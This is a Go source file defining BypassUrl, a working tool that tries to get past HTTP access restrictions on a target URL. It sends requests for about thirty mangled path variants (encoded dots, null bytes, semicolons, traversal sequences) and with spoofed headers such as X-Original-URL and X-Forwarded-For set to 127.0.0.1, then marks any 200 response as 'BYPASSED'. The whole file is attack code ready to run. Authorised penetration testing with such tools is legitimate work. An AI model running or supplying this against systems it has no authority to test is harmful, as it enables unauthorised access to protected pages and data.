package functions

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func BypassUrl(target string, hideFails bool) {
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "http://" + target
	}

	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("[-] Error parsing URL:", target)
		return
	}

	fmt.Println("[+] Host:", parsedURL.Host)
	Path := parsedURL.Path
	if Path == "" {
		Path = "/"
	}

	fmt.Println("[+] Base Path:", Path)

	client := &http.Client{}

	pathsToTry := []string{
		Path,
		Path + "/",
		Path + "//",
		Path + "/.",
		Path + "/./",
		Path + "%2e/",
		Path + "%2e%2e/",
		Path + "/%2e",
		Path + "/%2e/",
		Path + "/%2e%2e/",
		Path + "/.%2e/",
		Path + "%20",
		Path + "%09",
		Path + "%00",
		Path + "/%20/",
		Path + "/%09/",
		Path + "/%00/",
		Path + "/..%00/",
		Path + "?anything",
		Path + "/?anything",
		Path + "/../" + strings.TrimLeft(Path, "/"),
		Path + "/..;/",
		Path + "//./",
		Path + "/./../",
		Path + "/%2e%2e%2f",
		Path + ";",
		Path + ";/",
		Path + "#",
		Path + "#anything",
		Path + "/%23",
		Path + "/%3f",
		Path + "/*",
	}

	fmt.Println("[=] Testing path-based bypasses:")
	for _, p := range pathsToTry {
		newURL := parsedURL.Scheme + "://" + parsedURL.Host + p
		req, err := http.NewRequest("GET", newURL, nil)
		if err != nil {
			fmt.Println("[-] Error creating request for path:", p)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			if !hideFails {
				fmt.Printf("[!] Path: %s → Request error\n", p)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			fmt.Printf("[!] Path: %s → Status: %d [BYPASSED]\n", p, resp.StatusCode)
		} else if !hideFails {
			fmt.Printf("[*] Path: %s → Status: %d\n", p, resp.StatusCode)
		}
	}

	fmt.Println("[=] Testing header-based bypasses:")
	headers := map[string]string{
		"X-Original-URL":            "/",
		"X-Rewrite-URL":             "/",
		"X-Forwarded-For":           "127.0.0.1",
		"X-Client-IP":               "127.0.0.1",
		"X-Remote-IP":               "127.0.0.1",
		"X-Remote-Addr":             "127.0.0.1",
		"X-Host":                    "127.0.0.1",
		"X-Forwarded-Host":          "127.0.0.1",
		"X-Custom-IP-Authorization": "127.0.0.1",
		"Referer":                   "http://127.0.0.1",
		"Origin":                    "http://127.0.0.1",
		"X-HTTP-Method-Override":    "HEAD",
	}

	for header, value := range headers {
		req, err := http.NewRequest("GET", target, nil)
		if err != nil {
			fmt.Println("[-] Error creating request")
			continue
		}

		req.Header.Set(header, value)

		resp, err := client.Do(req)
		if err != nil {
			if !hideFails {
				fmt.Printf("[!] %s → Request error\n", header)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			fmt.Printf("[*] %s: %s → Status: %d [BYPASSED]\n", header, value, resp.StatusCode)
		} else if !hideFails {
			fmt.Printf("[*] %s: %s → Status: %d\n", header, value, resp.StatusCode)
		}
	}
}
